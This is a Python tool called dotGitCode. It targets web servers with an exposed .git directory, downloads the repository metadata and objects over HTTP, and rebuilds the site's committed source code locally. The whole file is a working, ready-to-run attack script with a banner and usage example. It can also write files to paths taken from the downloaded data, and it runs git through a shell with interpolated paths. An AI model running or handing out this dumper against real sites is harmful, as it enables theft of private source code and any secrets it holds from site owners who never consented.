import sys, os, subprocess
import wget
import requests
import re
import urllib.parse
import time
from datetime import datetime




print("""
                                                                                                                                
         88                         ,ad8888ba,   88            ad888888b,    ,ad8888ba,                         88              
         88                ,d      d8"'    `"8b  ""    ,d     d8"     "88   d8"'    `"8b                        88              
         88                88     d8'                  88             a8P  d8'                                  88              
 ,adPPYb,88   ,adPPYba,  MM88MMM  88             88  MM88MMM       ,d8P"   88              ,adPPYba,    ,adPPYb,88   ,adPPYba,  
a8"    `Y88  a8"     "8a   88     88      88888  88    88        a8P"      88             a8"     "8a  a8"    `Y88  a8P_____88  
8b       88  8b       d8   88     Y8,        88  88    88      a8P'        Y8,            8b       d8  8b       88  8PP"""""""  
"8a,   ,d88  "8a,   ,a8"   88,     Y8a.    .a88  88    88,    d8"           Y8a.    .a8P  "8a,   ,a8"  "8a,   ,d88  "8b,   ,aa  
 `"8bbdP"Y8   `"YbbdP"'    "Y888    `"Y88888P"   88    "Y888  88888888888    `"Y8888Y"'    `"YbbdP"'    `"8bbdP"Y8   `"Ybbd8"'  
                                                                                                                                
                                                                                         v2021.04.10 by Truoc Phan

  [+] Discord:  https://discord.gg/2GTZKwN
  [+] Facebook: https://www.facebook.com/292706121240740
  [+] Github:   https://github.com/truocphan
  [+] Gmail:    truocphan112017@gmail.com

""")

headers = {
	"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
}

'''
proxies = {
	"http": "http://127.0.0.1:8080",
	"https": "http://127.0.0.1:8080"
}
'''

dotGit = [
	"COMMIT_EDITMSG",
	"FETCH_HEAD",
	"HEAD",
	"ORIG_HEAD",
	"config",
	"description",
	"logs/HEAD",
	"logs/refs/heads/master",
	"logs/refs/remotes/origin/HEAD",
	"logs/refs/remotes/origin/master",
	"logs/refs/stash",
	"refs/heads/master",
	"refs/remotes/origin/HEAD",
	"refs/remotes/origin/master",
	"refs/stash"
]


def git_cat_file(SHA1_hash, option="p"):
		proc = subprocess.Popen("cd {} && git cat-file -{} {}".format(ROOTDIR, option, SHA1_hash), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
		(out, err) = proc.communicate()
		return out


def Download_File_from_Server(resource):
	if requests.get(TARGET + resource, headers=headers).status_code == 200:
		file_path = resource.split("/")
		if not os.path.exists(os.path.join(ROOTDIR, ".git", *file_path[:-1])):
			os.makedirs(os.path.join(ROOTDIR, ".git", *file_path[:-1]))
		print(" ==> Downloading: {}".format(TARGET + resource))
		if os.path.exists(os.path.join(ROOTDIR, ".git", *file_path)):
			os.remove(os.path.join(ROOTDIR, ".git", *file_path))
		wget.download(TARGET + resource, os.path.join(ROOTDIR, ".git", *file_path))
		print("\n")
		time.sleep(0.2)
		return True
	return False


def Download_Static_Files_dotGit():
	for rs in dotGit:
		if Download_File_from_Server(rs):
			f = open(os.path.join(ROOTDIR, ".git", *rs.split("/")))
			content = f.read()
			f.close()
			for SHA1_hash in re.findall("[0-9a-fA-F]{40}", content):
				if SHA1_hash not in Object_hash_unknown:
					Object_hash_unknown.append(SHA1_hash)


def Download_Objects():
	global Object_hash_unknown
	Object_hash_unknown = list(set(Object_hash_unknown))
	for obj in Object_hash_unknown:
		if os.path.exists(os.path.join(ROOTDIR, ".git", "objects", obj[:2], obj[2:])):
			print("[+] Downloaded: {}\n".format(TARGET+"objects/"+obj[:2]+"/"+obj[2:]))
			if obj not in Object_hash_exists:
				Object_hash_exists.append(obj)

			if git_cat_file(obj, "t") == b'commit\n':
				committed_datetime = datetime.fromtimestamp(int(re.findall(b"committer .* <.*> (\d+)", git_cat_file(obj))[0])).strftime("committed_%Y_%m_%d_%H_%M_%S")
				if not os.path.exists(os.path.join(ROOTDIR, "Restored_Data", committed_datetime)):
					os.makedirs(os.path.join(ROOTDIR, "Restored_Data", committed_datetime))
				node_hash = re.findall(b"tree ([0-9a-f]{40})", git_cat_file(obj))[0].decode("utf-8")
				Committed_Time[committed_datetime] = node_hash

			for newObj in re.findall(b"[a-f0-9]{40}", git_cat_file(obj)):
				if newObj.decode("utf-8") not in Object_hash_unknown:
					Object_hash_unknown.append(newObj.decode("utf-8"))
		else:
			if Download_File_from_Server("objects/"+obj[:2]+"/"+obj[2:]):
				if obj not in Object_hash_exists:
					Object_hash_exists.append(obj)

				if git_cat_file(obj, "t") == b'commit\n':
					committed_datetime = datetime.fromtimestamp(int(re.findall(b"committer .* <.*> (\d+)", git_cat_file(obj))[0])).strftime("committed_%Y_%m_%d_%H_%M_%S")
					if not os.path.exists(os.path.join(ROOTDIR, "Restored_Data", committed_datetime)):
						os.makedirs(os.path.join(ROOTDIR, "Restored_Data", committed_datetime))
					node_hash = re.findall(b"tree ([0-9a-f]{40})", git_cat_file(obj))[0].decode("utf-8")
					Committed_Time[committed_datetime] = node_hash

				for newObj in re.findall(b"[a-f0-9]{40}", git_cat_file(obj)):
					if newObj.decode("utf-8") not in Object_hash_unknown:
						Object_hash_unknown.append(newObj.decode("utf-8"))


def Data_Restore(SHA1_hash, File_Path):
	tree_blob = re.findall(b"\d+ (.+) ([a-f0-9]{40})\t(.+)", git_cat_file(SHA1_hash))
	for data in tree_blob:
		if data[1].decode("utf-8") in Object_hash_exists:
			if data[0] == b'blob' and not re.search("{}".format(data[1]).encode("utf-8"), git_cat_file(data[1].decode("utf-8"))):
				f = open(os.path.join(ROOTDIR, File_Path, data[2].decode("utf-8")), "wb")
				f.write(git_cat_file(data[1].decode("utf-8")))
				f.close()
				print(" ===> File:", os.path.join(ROOTDIR, File_Path, data[2].decode("utf-8")))
			elif data[0] == b'tree':
				if not os.path.exists(os.path.join(ROOTDIR, File_Path, data[2].decode("utf-8"))):
					os.makedirs(os.path.join(ROOTDIR, File_Path, data[2].decode("utf-8")))
					print(" ===> Folder:", os.path.join(ROOTDIR, File_Path, data[2].decode("utf-8")))
				Data_Restore(data[1].decode("utf-8"), os.path.join(File_Path, data[2].decode("utf-8")))




def main():
	if len(sys.argv) != 2:
		exit("""
 Usage: python3 {} <URL>
  Example: python3 {} http://example.com/.git/
""".format(sys.argv[0], sys.argv[0]))

	global TARGET, ROOTDIR, Object_hash_unknown, Object_hash_exists, Committed_Time
	TARGET = sys.argv[1]
	ROOTDIR = os.path.join(os.getcwd(), urllib.parse.urlparse(TARGET).netloc.replace(":","_"))
	Object_hash_unknown = list()
	Object_hash_exists = list()
	Committed_Time = dict()
	if not os.path.exists(os.path.join(ROOTDIR, ".git")):
		os.makedirs(os.path.join(ROOTDIR, ".git"))

	Download_Static_Files_dotGit()
	Download_Objects()
	print(" *** Restored DATA ***")
	for committed in Committed_Time:
		Data_Restore(Committed_Time[committed], os.path.join("Restored_Data", committed))




if __name__ == "__main__":
	main()
